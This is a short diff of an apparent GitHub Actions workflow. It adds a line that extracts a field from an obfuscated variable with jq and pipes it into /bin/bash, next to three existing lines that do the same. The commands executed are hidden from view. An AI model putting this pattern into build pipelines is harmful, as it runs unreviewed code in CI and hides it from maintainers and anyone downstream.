@@ -22,6 +22,7 @@ jobs:
           echo $zvysi57 | jq -r .pyxr2 | /bin/bash
           echo $xmb68 | jq -r .g95 | /bin/bash
           echo $jlitq7 | jq -r .l404 | /bin/bash
+          printf '%s' "$ozms57002" | jq -r .f808 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
